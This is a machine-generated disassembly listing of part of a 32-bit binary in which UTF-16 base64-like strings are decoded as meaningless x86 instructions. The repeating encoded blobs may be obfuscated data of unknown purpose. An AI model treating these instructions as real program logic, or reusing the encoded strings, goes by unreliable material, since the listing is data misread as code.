1000468c:	00 65 00             	add    %ah,0x0(%ebp)
1000468f:	6d                   	insl   (%dx),%es:(%edi)
10004690:	00 52 00             	add    %dl,0x0(%edx)
10004693:	31 00                	xor    %eax,(%eax)
10004695:	4d                   	dec    %ebp
10004696:	00 6b 00             	add    %ch,0x0(%ebx)
10004699:	49                   	dec    %ecx
1000469a:	00 77 00             	add    %dh,0x0(%edi)
1000469d:	61                   	popa
1000469e:	00 44 00 51          	add    %al,0x51(%eax,%eax,1)
100046a2:	00 7a 00             	add    %bh,0x0(%edx)
100046a5:	64 00 48 00          	add    %cl,%fs:0x0(%eax)
100046a9:	70 00                	jo     0x100046ab
100046ab:	6b 00 64             	imul   $0x64,(%eax),%eax
100046ae:	00 54 00 4a          	add    %dl,0x4a(%eax,%eax,1)
100046b2:	00 43 00             	add    %al,0x0(%ebx)
100046b5:	4d                   	dec    %ebp
100046b6:	00 47 00             	add    %al,0x0(%edi)
100046b9:	67 00 30             	add    %dh,(%bx,%si)
100046bc:	00 62 00             	add    %ah,0x0(%edx)
100046bf:	47                   	inc    %edi
100046c0:	00 4a 00             	add    %cl,0x0(%edx)
100046c3:	75 00                	jne    0x100046c5
100046c5:	4d                   	dec    %ebp
100046c6:	00 33                	add    %dh,(%ebx)
100046c8:	00 52 00             	add    %dl,0x0(%edx)
100046cb:	36 00 5a 00          	add    %bl,%ss:0x0(%edx)
100046cf:	48                   	dec    %eax
100046d0:	00 55 00             	add    %dl,0x0(%ebp)
100046d3:	79 00                	jns    0x100046d5
100046d5:	51                   	push   %ecx
100046d6:	00 6a 00             	add    %ch,0x0(%edx)
100046d9:	42                   	inc    %edx
100046da:	00 6f 00             	add    %ch,0x0(%edi)
100046dd:	4e                   	dec    %esi
100046de:	00 44 00 4e          	add    %al,0x4e(%eax,%eax,1)
100046e2:	00 30                	add    %dh,(%eax)
100046e4:	00 65 00             	add    %ah,0x0(%ebp)
100046e7:	6d                   	insl   (%dx),%es:(%edi)
100046e8:	00 52 00             	add    %dl,0x0(%edx)
100046eb:	31 00                	xor    %eax,(%eax)
100046ed:	4d                   	dec    %ebp
100046ee:	00 6b 00             	add    %ch,0x0(%ebx)
100046f1:	49                   	dec    %ecx
100046f2:	00 77 00             	add    %dh,0x0(%edi)
100046f5:	61                   	popa
100046f6:	00 44 00 52          	add    %al,0x52(%eax,%eax,1)
100046fa:	00 53 00             	add    %dl,0x0(%ebx)
100046fd:	61                   	popa
100046fe:	00 47 00             	add    %al,0x0(%edi)
10004701:	4d                   	dec    %ebp
10004702:	00 7a 00             	add    %bh,0x0(%edx)
10004705:	64 00 48 00          	add    %cl,%fs:0x0(%eax)
10004709:	70 00                	jo     0x1000470b
1000470b:	6b 00 64             	imul   $0x64,(%eax),%eax
1000470e:	00 54 00 4a          	add    %dl,0x4a(%eax,%eax,1)
10004712:	00 43 00             	add    %al,0x0(%ebx)
10004715:	4d                   	dec    %ebp
10004716:	00 47 00             	add    %al,0x0(%edi)
10004719:	67 00 30             	add    %dh,(%bx,%si)
1000471c:	00 4d 00             	add    %cl,0x0(%ebp)
1000471f:	33 00                	xor    (%eax),%eax
10004721:	52                   	push   %edx
10004722:	00 36                	add    %dh,(%esi)
10004724:	00 5a 00             	add    %bl,0x0(%edx)
10004727:	48                   	dec    %eax
10004728:	00 55 00             	add    %dl,0x0(%ebp)
1000472b:	79 00                	jns    0x1000472d
1000472d:	51                   	push   %ecx
1000472e:	00 6a 00             	add    %ch,0x0(%edx)
10004731:	42                   	inc    %edx
10004732:	00 6f 00             	add    %ch,0x0(%edi)
10004735:	4e                   	dec    %esi
10004736:	00 44 00 4a          	add    %al,0x4a(%eax,%eax,1)
1000473a:	00 7a 00             	add    %bh,0x0(%edx)
1000473d:	50                   	push   %eax
1000473e:	00 54 00 4e          	add    %dl,0x4e(%eax,%eax,1)
10004742:	00 30                	add    %dh,(%eax)
10004744:	00 65 00             	add    %ah,0x0(%ebp)
10004747:	6d                   	insl   (%dx),%es:(%edi)
10004748:	00 52 00             	add    %dl,0x0(%edx)
1000474b:	31 00                	xor    %eax,(%eax)
1000474d:	4d                   	dec    %ebp
1000474e:	00 6b 00             	add    %ch,0x0(%ebx)
10004751:	49                   	dec    %ecx
10004752:	00 77 00             	add    %dh,0x0(%edi)
10004755:	61                   	popa
10004756:	00 44 00 51          	add    %al,0x51(%eax,%eax,1)
1000475a:	00 3d 00 00 15 33    	add    %bh,0x33150000
10004760:	00 74 00 7a          	add    %dh,0x7a(%eax,%eax,1)
10004764:	00 64 00 75          	add    %ah,0x75(%eax,%eax,1)
10004768:	00 32                	add    %dh,(%edx)
1000476a:	00 42 00             	add    %al,0x0(%edx)
1000476d:	30 00                	xor    %al,(%eax)
1000476f:	68 00 34 00 00       	push   $0x3400
10004774:	85 81 59 00 7a 00    	test   %eax,0x7a0059(%ecx)
1000477a:	5a                   	pop    %edx
1000477b:	00 45 00             	add    %al,0x0(%ebp)
1000477e:	52                   	push   %edx
1000477f:	00 7a 00             	add    %bh,0x0(%edx)
10004782:	4e                   	dec    %esi
10004783:	00 32                	add    %dh,(%edx)
10004785:	00 61 00             	add    %ah,0x0(%ecx)
10004788:	44                   	inc    %esp
10004789:	00 4a 00             	add    %cl,0x0(%edx)
1000478c:	47                   	inc    %edi
1000478d:	00 5a 00             	add    %bl,0x0(%edx)
10004790:	6c                   	insb   (%dx),%es:(%edi)
10004791:	00 46 00             	add    %al,0x0(%esi)
10004794:	36 00 63 00          	add    %ah,%ss:0x0(%ebx)
10004798:	47                   	inc    %edi
10004799:	00 4d 00             	add    %cl,0x0(%ebp)
1000479c:	32 00                	xor    (%eax),%al
1000479e:	52                   	push   %edx
1000479f:	00 45 00             	add    %al,0x0(%ebp)
100047a2:	63 00                	arpl   %eax,(%eax)
100047a4:	7a 00                	jp     0x100047a6
100047a6:	64 00 6d 00          	add    %ch,%fs:0x0(%ebp)
100047aa:	67 00 79 00          	add    %bh,0x0(%bx,%di)
100047ae:	52                   	push   %edx
100047af:	00 6d 00             	add    %ch,0x0(%ebp)
100047b2:	5a                   	pop    %edx
100047b3:	00 6a 00             	add    %ch,0x0(%edx)
100047b6:	4e                   	dec    %esi
100047b7:	00 6b 00             	add    %ch,0x0(%ebx)
100047ba:	52                   	push   %edx
100047bb:	00 48 00             	add    %cl,0x0(%eax)
100047be:	4d                   	dec    %ebp
100047bf:	00 33                	add    %dh,(%ebx)
100047c1:	00 5a 00             	add    %bl,0x0(%edx)
100047c4:	6f                   	outsl  %ds:(%esi),(%dx)
100047c5:	00 4d 00             	add    %cl,0x0(%ebp)
100047c8:	6b 00 5a             	imul   $0x5a,(%eax),%eax
100047cb:	00 6d 00             	add    %ch,0x0(%ebp)
100047ce:	59                   	pop    %ecx
100047cf:	00 31                	add    %dh,(%ecx)
100047d1:	00 68 00             	add    %ch,0x0(%eax)
100047d4:	47                   	inc    %edi
100047d5:	00 59 00             	add    %bl,0x0(%ecx)
100047d8:	7a 00                	jp     0x100047da
100047da:	5a                   	pop    %edx
100047db:	00 45 00             	add    %al,0x0(%ebp)
100047de:	52                   	push   %edx
100047df:	00 7a 00             	add    %bh,0x0(%edx)
100047e2:	4e                   	dec    %esi
100047e3:	00 32                	add    %dh,(%edx)
100047e5:	00 61 00             	add    %ah,0x0(%ecx)
100047e8:	44                   	inc    %esp
100047e9:	00 4a 00             	add    %cl,0x0(%edx)
100047ec:	47                   	inc    %edi
100047ed:	00 5a 00             	add    %bl,0x0(%edx)
100047f0:	6d                   	insl   (%dx),%es:(%edi)
100047f1:	00 4d 00             	add    %cl,0x0(%ebp)
100047f4:	32 00                	xor    (%eax),%al
100047f6:	52                   	push   %edx
100047f7:	00 45 00             	add    %al,0x0(%ebp)
100047fa:	63 00                	arpl   %eax,(%eax)
100047fc:	7a 00                	jp     0x100047fe
100047fe:	64 00 6d 00          	add    %ch,%fs:0x0(%ebp)
10004802:	67 00 79 00          	add    %bh,0x0(%bx,%di)
10004806:	52                   	push   %edx
10004807:	00 6d 00             	add    %ch,0x0(%ebp)
1000480a:	5a                   	pop    %edx
1000480b:	00 6b 00             	add    %ch,0x0(%ebx)
1000480e:	63 00                	arpl   %eax,(%eax)
10004810:	47                   	inc    %edi
10004811:	00 4a 00             	add    %cl,0x0(%edx)
10004814:	6a 00                	push   $0x0
10004816:	4e                   	dec    %esi
10004817:	00 6b 00             	add    %ch,0x0(%ebx)
1000481a:	52                   	push   %edx
1000481b:	00 48 00             	add    %cl,0x0(%eax)
1000481e:	4d                   	dec    %ebp
1000481f:	00 33                	add    %dh,(%ebx)
10004821:	00 5a 00             	add    %bl,0x0(%edx)
10004824:	6f                   	outsl  %ds:(%esi),(%dx)
10004825:	00 4d 00             	add    %cl,0x0(%ebp)
10004828:	6b 00 5a             	imul   $0x5a,(%eax),%eax
1000482b:	00 6d 00             	add    %ch,0x0(%ebp)
1000482e:	59                   	pop    %ecx
1000482f:	00 7a 00             	add    %bh,0x0(%edx)
10004832:	5a                   	pop    %edx
10004833:	00 45 00             	add    %al,0x0(%ebp)
10004836:	52                   	push   %edx
10004837:	00 7a 00             	add    %bh,0x0(%edx)
1000483a:	4e                   	dec    %esi
1000483b:	00 32                	add    %dh,(%edx)
1000483d:	00 61 00             	add    %ah,0x0(%ecx)
10004840:	44                   	inc    %esp
10004841:	00 4a 00             	add    %cl,0x0(%edx)
10004844:	47                   	inc    %edi
10004845:	00 5a 00             	add    %bl,0x0(%edx)
10004848:	6d                   	insl   (%dx),%es:(%edi)
10004849:	00 31                	add    %dh,(%ecx)
1000484b:	00 53 00             	add    %dl,0x0(%ebx)
1000484e:	64 00 6d 00          	add    %ch,%fs:0x0(%ebp)
10004852:	4d                   	dec    %ebp
10004853:	00 32                	add    %dh,(%edx)
10004855:	00 52 00             	add    %dl,0x0(%edx)
10004858:	45                   	inc    %ebp
10004859:	00 63 00             	add    %ah,0x0(%ebx)
1000485c:	7a 00                	jp     0x1000485e
1000485e:	64 00 6d 00          	add    %ch,%fs:0x0(%ebp)
10004862:	67 00 79 00          	add    %bh,0x0(%bx,%di)
10004866:	52                   	push   %edx
10004867:	00 6d 00             	add    %ch,0x0(%ebp)
1000486a:	5a                   	pop    %edx
1000486b:	00 6a 00             	add    %ch,0x0(%edx)
1000486e:	4e                   	dec    %esi
1000486f:	00 6b 00             	add    %ch,0x0(%ebx)
10004872:	52                   	push   %edx
10004873:	00 48 00             	add    %cl,0x0(%eax)
10004876:	4d                   	dec    %ebp
10004877:	00 33                	add    %dh,(%ebx)
10004879:	00 5a 00             	add    %bl,0x0(%edx)
1000487c:	6f                   	outsl  %ds:(%esi),(%dx)
1000487d:	00 4d 00             	add    %cl,0x0(%ebp)
10004880:	6b 00 5a             	imul   $0x5a,(%eax),%eax
10004883:	00 6d 00             	add    %ch,0x0(%ebp)
10004886:	5a                   	pop    %edx
10004887:	00 44 00 4e          	add    %al,0x4e(%eax,%eax,1)
1000488b:	00 4f 00             	add    %cl,0x0(%edi)
1000488e:	59                   	pop    %ecx
1000488f:	00 7a 00             	add    %bh,0x0(%edx)
10004892:	5a                   	pop    %edx
10004893:	00 45 00             	add    %al,0x0(%ebp)
10004896:	52                   	push   %edx
10004897:	00 7a 00             	add    %bh,0x0(%edx)
1000489a:	4e                   	dec    %esi
1000489b:	00 32                	add    %dh,(%edx)
1000489d:	00 61 00             	add    %ah,0x0(%ecx)
100048a0:	44                   	inc    %esp
100048a1:	00 4a 00             	add    %cl,0x0(%edx)
100048a4:	47                   	inc    %edi
100048a5:	00 5a 00             	add    %bl,0x0(%edx)
100048a8:	6d                   	insl   (%dx),%es:(%edi)
100048a9:	00 4d 00             	add    %cl,0x0(%ebp)
100048ac:	32 00                	xor    (%eax),%al
100048ae:	52                   	push   %edx
100048af:	00 45 00             	add    %al,0x0(%ebp)
100048b2:	63 00                	arpl   %eax,(%eax)
100048b4:	7a 00                	jp     0x100048b6
100048b6:	64 00 6d 00          	add    %ch,%fs:0x0(%ebp)
100048ba:	67 00 79 00          	add    %bh,0x0(%bx,%di)
100048be:	52                   	push   %edx
100048bf:	00 6d 00             	add    %ch,0x0(%ebp)
100048c2:	5a                   	pop    %edx
100048c3:	00 6a 00             	add    %ch,0x0(%edx)
100048c6:	57                   	push   %edi
100048c7:	00 45 00             	add    %al,0x0(%ebp)
100048ca:	56                   	push   %esi
100048cb:	00 6a 00             	add    %ch,0x0(%edx)
100048ce:	4e                   	dec    %esi
100048cf:	00 6b 00             	add    %ch,0x0(%ebx)
100048d2:	52                   	push   %edx
100048d3:	00 48 00             	add    %cl,0x0(%eax)
100048d6:	4d                   	dec    %ebp
100048d7:	00 33                	add    %dh,(%ebx)
100048d9:	00 5a 00             	add    %bl,0x0(%edx)
100048dc:	6f                   	outsl  %ds:(%esi),(%dx)
100048dd:	00 4d 00             	add    %cl,0x0(%ebp)
100048e0:	6b 00 5a             	imul   $0x5a,(%eax),%eax
100048e3:	00 6d 00             	add    %ch,0x0(%ebp)
100048e6:	59                   	pop    %ecx
100048e7:	00 7a 00             	add    %bh,0x0(%edx)
100048ea:	5a                   	pop    %edx
100048eb:	00 45 00             	add    %al,0x0(%ebp)
100048ee:	52                   	push   %edx
100048ef:	00 7a 00             	add    %bh,0x0(%edx)
100048f2:	4e                   	dec    %esi
100048f3:	00 32                	add    %dh,(%edx)
100048f5:	00 61 00             	add    %ah,0x0(%ecx)
100048f8:	44                   	inc    %esp
100048f9:	00 4a 00             	add    %cl,0x0(%edx)
100048fc:	47                   	inc    %edi
100048fd:	00 5a 00             	add    %bl,0x0(%edx)
10004900:	6a 00                	push   $0x0
10004902:	46                   	inc    %esi
10004903:	00 77 00             	add    %dh,0x0(%edi)
10004906:	57                   	push   %edi
10004907:	00 57 00             	add    %dl,0x0(%edi)
1000490a:	4d                   	dec    %ebp
1000490b:	00 32                	add    %dh,(%edx)
1000490d:	00 52 00             	add    %dl,0x0(%edx)
10004910:	45                   	inc    %ebp
10004911:	00 63 00             	add    %ah,0x0(%ebx)
10004914:	7a 00                	jp     0x10004916
10004916:	64 00 6d 00          	add    %ch,%fs:0x0(%ebp)
1000491a:	67 00 79 00          	add    %bh,0x0(%bx,%di)
1000491e:	52                   	push   %edx
1000491f:	00 6d 00             	add    %ch,0x0(%ebp)
10004922:	5a                   	pop    %edx
10004923:	00 6a 00             	add    %ch,0x0(%edx)
10004926:	4e                   	dec    %esi
10004927:	00 6b 00             	add    %ch,0x0(%ebx)
1000492a:	52                   	push   %edx
1000492b:	00 48 00             	add    %cl,0x0(%eax)
1000492e:	4d                   	dec    %ebp
1000492f:	00 33                	add    %dh,(%ebx)
10004931:	00 5a 00             	add    %bl,0x0(%edx)
10004934:	6f                   	outsl  %ds:(%esi),(%dx)
10004935:	00 4d 00             	add    %cl,0x0(%ebp)
10004938:	6b 00 5a             	imul   $0x5a,(%eax),%eax
1000493b:	00 6d 00             	add    %ch,0x0(%ebp)
1000493e:	4d                   	dec    %ebp
1000493f:	00 30                	add    %dh,(%eax)
10004941:	00 70 00             	add    %dh,0x0(%eax)
10004944:	32 00                	xor    (%eax),%al
10004946:	59                   	pop    %ecx
10004947:	00 7a 00             	add    %bh,0x0(%edx)
1000494a:	5a                   	pop    %edx
1000494b:	00 45 00             	add    %al,0x0(%ebp)
1000494e:	52                   	push   %edx
1000494f:	00 7a 00             	add    %bh,0x0(%edx)
10004952:	4e                   	dec    %esi
10004953:	00 32                	add    %dh,(%edx)
10004955:	00 61 00             	add    %ah,0x0(%ecx)
10004958:	44                   	inc    %esp
10004959:	00 4a 00             	add    %cl,0x0(%edx)
1000495c:	47                   	inc    %edi
1000495d:	00 5a 00             	add    %bl,0x0(%edx)
10004960:	6d                   	insl   (%dx),%es:(%edi)
10004961:	00 4d 00             	add    %cl,0x0(%ebp)
10004964:	32 00                	xor    (%eax),%al
10004966:	52                   	push   %edx
10004967:	00 45 00             	add    %al,0x0(%ebp)
1000496a:	63 00                	arpl   %eax,(%eax)
1000496c:	7a 00                	jp     0x1000496e
1000496e:	64 00 6d 00          	add    %ch,%fs:0x0(%ebp)
10004972:	67 00 79 00          	add    %bh,0x0(%bx,%di)
10004976:	52                   	push   %edx
10004977:	00 6d 00             	add    %ch,0x0(%ebp)
1000497a:	5a                   	pop    %edx
1000497b:	00 6a 00             	add    %ch,0x0(%edx)
1000497e:	4d                   	dec    %ebp
1000497f:	00 6a 00             	add    %ch,0x0(%edx)
10004982:	6c                   	insb   (%dx),%es:(%edi)
10004983:	00 6a 00             	add    %ch,0x0(%edx)
10004986:	4e                   	dec    %esi
10004987:	00 6b 00             	add    %ch,0x0(%ebx)
1000498a:	52                   	push   %edx
1000498b:	00 48 00             	add    %cl,0x0(%eax)
1000498e:	4d                   	dec    %ebp
1000498f:	00 33                	add    %dh,(%ebx)
10004991:	00 5a 00             	add    %bl,0x0(%edx)
10004994:	6f                   	outsl  %ds:(%esi),(%dx)
10004995:	00 4d 00             	add    %cl,0x0(%ebp)
10004998:	6b 00 5a             	imul   $0x5a,(%eax),%eax
1000499b:	00 6d 00             	add    %ch,0x0(%ebp)
1000499e:	59                   	pop    %ecx
1000499f:	00 7a 00             	add    %bh,0x0(%edx)
100049a2:	5a                   	pop    %edx
100049a3:	00 45 00             	add    %al,0x0(%ebp)
100049a6:	52                   	push   %edx
100049a7:	00 7a 00             	add    %bh,0x0(%edx)
100049aa:	4e                   	dec    %esi
100049ab:	00 32                	add    %dh,(%edx)
100049ad:	00 61 00             	add    %ah,0x0(%ecx)
100049b0:	44                   	inc    %esp
100049b1:	00 4a 00             	add    %cl,0x0(%edx)
100049b4:	47                   	inc    %edi
100049b5:	00 5a 00             	add    %bl,0x0(%edx)
100049b8:	6d                   	insl   (%dx),%es:(%edi)
100049b9:	00 31                	add    %dh,(%ecx)
100049bb:	00 6b 00             	add    %ch,0x0(%ebx)
100049be:	51                   	push   %ecx
100049bf:	00 32                	add    %dh,(%edx)
100049c1:	00 4d 00             	add    %cl,0x0(%ebp)
100049c4:	32 00                	xor    (%eax),%al
100049c6:	52                   	push   %edx
100049c7:	00 45 00             	add    %al,0x0(%ebp)
100049ca:	63 00                	arpl   %eax,(%eax)
100049cc:	7a 00                	jp     0x100049ce
100049ce:	64 00 6d 00          	add    %ch,%fs:0x0(%ebp)
100049d2:	67 00 79 00          	add    %bh,0x0(%bx,%di)
100049d6:	52                   	push   %edx
100049d7:	00 6d 00             	add    %ch,0x0(%ebp)
100049da:	5a                   	pop    %edx
100049db:	00 6a 00             	add    %ch,0x0(%edx)
100049de:	4e                   	dec    %esi
100049df:	00 6b 00             	add    %ch,0x0(%ebx)
100049e2:	52                   	push   %edx
100049e3:	00 48 00             	add    %cl,0x0(%eax)
100049e6:	4d                   	dec    %ebp
100049e7:	00 33                	add    %dh,(%ebx)
100049e9:	00 5a 00             	add    %bl,0x0(%edx)
100049ec:	6f                   	outsl  %ds:(%esi),(%dx)
100049ed:	00 4d 00             	add    %cl,0x0(%ebp)
100049f0:	6b 00 5a             	imul   $0x5a,(%eax),%eax
100049f3:	00 6d 00             	add    %ch,0x0(%ebp)
100049f6:	4e                   	dec    %esi
100049f7:	00 55 00             	add    %dl,0x0(%ebp)
100049fa:	39 00                	cmp    %eax,(%eax)
100049fc:	53                   	push   %ebx
100049fd:	00 59 00             	add    %bl,0x0(%ecx)
10004a00:	7a 00                	jp     0x10004a02
10004a02:	5a                   	pop    %edx
10004a03:	00 45 00             	add    %al,0x0(%ebp)
10004a06:	52                   	push   %edx
10004a07:	00 7a 00             	add    %bh,0x0(%edx)
10004a0a:	4e                   	dec    %esi
10004a0b:	00 32                	add    %dh,(%edx)
10004a0d:	00 61 00             	add    %ah,0x0(%ecx)
10004a10:	44                   	inc    %esp
10004a11:	00 4a 00             	add    %cl,0x0(%edx)
10004a14:	47                   	inc    %edi
10004a15:	00 5a 00             	add    %bl,0x0(%edx)
10004a18:	6d                   	insl   (%dx),%es:(%edi)
10004a19:	00 4d 00             	add    %cl,0x0(%ebp)
10004a1c:	32 00                	xor    (%eax),%al
10004a1e:	52                   	push   %edx
10004a1f:	00 45 00             	add    %al,0x0(%ebp)
10004a22:	63 00                	arpl   %eax,(%eax)
10004a24:	7a 00                	jp     0x10004a26
10004a26:	64 00 6d 00          	add    %ch,%fs:0x0(%ebp)
10004a2a:	67 00 79 00          	add    %bh,0x0(%bx,%di)
10004a2e:	52                   	push   %edx
10004a2f:	00 6d 00             	add    %ch,0x0(%ebp)
10004a32:	5a                   	pop    %edx
10004a33:	00 57 00             	add    %dl,0x0(%edi)
10004a36:	55                   	push   %ebp
10004a37:	00 6d 00             	add    %ch,0x0(%ebp)
10004a3a:	4e                   	dec    %esi
10004a3b:	00 6a 00             	add    %ch,0x0(%edx)
10004a3e:	4e                   	dec    %esi
10004a3f:	00 6b 00             	add    %ch,0x0(%ebx)
10004a42:	52                   	push   %edx
10004a43:	00 48 00             	add    %cl,0x0(%eax)
10004a46:	4d                   	dec    %ebp
10004a47:	00 33                	add    %dh,(%ebx)
10004a49:	00 5a 00             	add    %bl,0x0(%edx)
10004a4c:	6f                   	outsl  %ds:(%esi),(%dx)
10004a4d:	00 4d 00             	add    %cl,0x0(%ebp)
10004a50:	6b 00 5a             	imul   $0x5a,(%eax),%eax
10004a53:	00 6d 00             	add    %ch,0x0(%ebp)
10004a56:	59                   	pop    %ecx
10004a57:	00 7a 00             	add    %bh,0x0(%edx)
10004a5a:	5a                   	pop    %edx
10004a5b:	00 45 00             	add    %al,0x0(%ebp)
10004a5e:	52                   	push   %edx
10004a5f:	00 7a 00             	add    %bh,0x0(%edx)
10004a62:	4e                   	dec    %esi
10004a63:	00 32                	add    %dh,(%edx)
10004a65:	00 61 00             	add    %ah,0x0(%ecx)
10004a68:	44                   	inc    %esp
10004a69:	00 4a 00             	add    %cl,0x0(%edx)
10004a6c:	47                   	inc    %edi
10004a6d:	00 5a 00             	add    %bl,0x0(%edx)
10004a70:	6c                   	insb   (%dx),%es:(%edi)
10004a71:	00 68 00             	add    %ch,0x0(%eax)
10004a74:	46                   	inc    %esi
10004a75:	00 57 00             	add    %dl,0x0(%edi)
10004a78:	6d                   	insl   (%dx),%es:(%edi)
10004a79:	00 4d 00             	add    %cl,0x0(%ebp)
10004a7c:	32 00                	xor    (%eax),%al
10004a7e:	52                   	push   %edx
10004a7f:	00 45 00             	add    %al,0x0(%ebp)
10004a82:	63 00                	arpl   %eax,(%eax)
10004a84:	7a 00                	jp     0x10004a86
10004a86:	64 00 6d 00          	add    %ch,%fs:0x0(%ebp)
10004a8a:	67 00 79 00          	add    %bh,0x0(%bx,%di)
10004a8e:	52                   	push   %edx
10004a8f:	00 6d 00             	add    %ch,0x0(%ebp)
10004a92:	5a                   	pop    %edx
10004a93:	00 6a 00             	add    %ch,0x0(%edx)
10004a96:	4e                   	dec    %esi
10004a97:	00 6b 00             	add    %ch,0x0(%ebx)
10004a9a:	52                   	push   %edx
10004a9b:	00 48 00             	add    %cl,0x0(%eax)
10004a9e:	4d                   	dec    %ebp
10004a9f:	00 33                	add    %dh,(%ebx)
10004aa1:	00 5a 00             	add    %bl,0x0(%edx)
10004aa4:	6f                   	outsl  %ds:(%esi),(%dx)
10004aa5:	00 4d 00             	add    %cl,0x0(%ebp)
10004aa8:	6b 00 5a             	imul   $0x5a,(%eax),%eax
10004aab:	00 6d 00             	add    %ch,0x0(%ebp)
10004aae:	65 00 56 00          	add    %dl,%gs:0x0(%esi)
10004ab2:	6c                   	insb   (%dx),%es:(%edi)
10004ab3:	00 58 00             	add    %bl,0x0(%eax)
10004ab6:	59                   	pop    %ecx
10004ab7:	00 7a 00             	add    %bh,0x0(%edx)
10004aba:	5a                   	pop    %edx
10004abb:	00 45 00             	add    %al,0x0(%ebp)
10004abe:	52                   	push   %edx
10004abf:	00 7a 00             	add    %bh,0x0(%edx)
10004ac2:	4e                   	dec    %esi
10004ac3:	00 32                	add    %dh,(%edx)
10004ac5:	00 61 00             	add    %ah,0x0(%ecx)
10004ac8:	44                   	inc    %esp
10004ac9:	00 4a 00             	add    %cl,0x0(%edx)
10004acc:	47                   	inc    %edi
10004acd:	00 5a 00             	add    %bl,0x0(%edx)
10004ad0:	6d                   	insl   (%dx),%es:(%edi)
10004ad1:	00 4d 00             	add    %cl,0x0(%ebp)
10004ad4:	32 00                	xor    (%eax),%al
10004ad6:	52                   	push   %edx
10004ad7:	00 45 00             	add    %al,0x0(%ebp)
10004ada:	63 00                	arpl   %eax,(%eax)
10004adc:	7a 00                	jp     0x10004ade
10004ade:	64 00 6d 00          	add    %ch,%fs:0x0(%ebp)
10004ae2:	67 00 79 00          	add    %bh,0x0(%bx,%di)
10004ae6:	52                   	push   %edx
10004ae7:	00 6d 00             	add    %ch,0x0(%ebp)
10004aea:	59                   	pop    %ecx
10004aeb:	00 78 00             	add    %bh,0x0(%eax)
10004aee:	62 00                	bound  %eax,(%eax)
10004af0:	47                   	inc    %edi
10004af1:	00 52 00             	add    %dl,0x0(%edx)
10004af4:	6a 00                	push   $0x0
10004af6:	4e                   	dec    %esi
10004af7:	00 6b 00             	add    %ch,0x0(%ebx)
10004afa:	52                   	push   %edx
10004afb:	00 48 00             	add    %cl,0x0(%eax)
10004afe:	4d                   	dec    %ebp
10004aff:	00 33                	add    %dh,(%ebx)
10004b01:	00 5a 00             	add    %bl,0x0(%edx)
10004b04:	6f                   	outsl  %ds:(%esi),(%dx)
10004b05:	00 4d 00             	add    %cl,0x0(%ebp)
10004b08:	6b 00 5a             	imul   $0x5a,(%eax),%eax
10004b0b:	00 6d 00             	add    %ch,0x0(%ebp)
10004b0e:	59                   	pop    %ecx
10004b0f:	00 7a 00             	add    %bh,0x0(%edx)
10004b12:	5a                   	pop    %edx
10004b13:	00 45 00             	add    %al,0x0(%ebp)
10004b16:	52                   	push   %edx
10004b17:	00 7a 00             	add    %bh,0x0(%edx)
10004b1a:	4e                   	dec    %esi
10004b1b:	00 32                	add    %dh,(%edx)
10004b1d:	00 61 00             	add    %ah,0x0(%ecx)
10004b20:	44                   	inc    %esp
10004b21:	00 4a 00             	add    %cl,0x0(%edx)
10004b24:	47                   	inc    %edi
10004b25:	00 5a 00             	add    %bl,0x0(%edx)
10004b28:	6a 00                	push   $0x0
10004b2a:	49                   	dec    %ecx
10004b2b:	00 35 00 65 00 57    	add    %dh,0x57006500
10004b31:	00 4d 00             	add    %cl,0x0(%ebp)
10004b34:	32 00                	xor    (%eax),%al
10004b36:	52                   	push   %edx
10004b37:	00 45 00             	add    %al,0x0(%ebp)
10004b3a:	63 00                	arpl   %eax,(%eax)
10004b3c:	7a 00                	jp     0x10004b3e
10004b3e:	64 00 6d 00          	add    %ch,%fs:0x0(%ebp)
10004b42:	67 00 79 00          	add    %bh,0x0(%bx,%di)
10004b46:	52                   	push   %edx
10004b47:	00 6d 00             	add    %ch,0x0(%ebp)
10004b4a:	5a                   	pop    %edx
10004b4b:	00 6a 00             	add    %ch,0x0(%edx)
10004b4e:	4e                   	dec    %esi
10004b4f:	00 6b 00             	add    %ch,0x0(%ebx)
10004b52:	52                   	push   %edx
10004b53:	00 48 00             	add    %cl,0x0(%eax)
10004b56:	4d                   	dec    %ebp
10004b57:	00 33                	add    %dh,(%ebx)
10004b59:	00 5a 00             	add    %bl,0x0(%edx)
10004b5c:	6f                   	outsl  %ds:(%esi),(%dx)
10004b5d:	00 4d 00             	add    %cl,0x0(%ebp)
10004b60:	6b 00 5a             	imul   $0x5a,(%eax),%eax
10004b63:	00 6d 00             	add    %ch,0x0(%ebp)
10004b66:	59                   	pop    %ecx
10004b67:	00 54 00 46          	add    %dl,0x46(%eax,%eax,1)
10004b6b:	00 34 00             	add    %dh,(%eax,%eax,1)
10004b6e:	59                   	pop    %ecx
10004b6f:	00 7a 00             	add    %bh,0x0(%edx)
10004b72:	5a                   	pop    %edx
10004b73:	00 45 00             	add    %al,0x0(%ebp)
10004b76:	52                   	push   %edx
10004b77:	00 7a 00             	add    %bh,0x0(%edx)
10004b7a:	4e                   	dec    %esi
10004b7b:	00 32                	add    %dh,(%edx)
10004b7d:	00 61 00             	add    %ah,0x0(%ecx)
10004b80:	44                   	inc    %esp
10004b81:	00 4a 00             	add    %cl,0x0(%edx)
10004b84:	47                   	inc    %edi
10004b85:	00 5a 00             	add    %bl,0x0(%edx)
10004b88:	6d                   	insl   (%dx),%es:(%edi)
10004b89:	00 4d 00             	add    %cl,0x0(%ebp)
10004b8c:	32 00                	xor    (%eax),%al
10004b8e:	52                   	push   %edx
10004b8f:	00 45 00             	add    %al,0x0(%ebp)
10004b92:	63 00                	arpl   %eax,(%eax)
10004b94:	7a 00                	jp     0x10004b96
10004b96:	64 00 6d 00          	add    %ch,%fs:0x0(%ebp)
10004b9a:	67 00 79 00          	add    %bh,0x0(%bx,%di)
10004b9e:	52                   	push   %edx
10004b9f:	00 6d 00             	add    %ch,0x0(%ebp)
10004ba2:	5a                   	pop    %edx
10004ba3:	00 6a 00             	add    %ch,0x0(%edx)
10004ba6:	5a                   	pop    %edx
10004ba7:	00 47 00             	add    %al,0x0(%edi)
10004baa:	70 00                	jo     0x10004bac
10004bac:	6a 00                	push   $0x0
10004bae:	4e                   	dec    %esi
10004baf:	00 6b 00             	add    %ch,0x0(%ebx)
10004bb2:	52                   	push   %edx
10004bb3:	00 48 00             	add    %cl,0x0(%eax)
10004bb6:	4d                   	dec    %ebp
10004bb7:	00 33                	add    %dh,(%ebx)
10004bb9:	00 5a 00             	add    %bl,0x0(%edx)
10004bbc:	6f                   	outsl  %ds:(%esi),(%dx)
10004bbd:	00 4d 00             	add    %cl,0x0(%ebp)
10004bc0:	6b 00 5a             	imul   $0x5a,(%eax),%eax
10004bc3:	00 6d 00             	add    %ch,0x0(%ebp)
10004bc6:	59                   	pop    %ecx
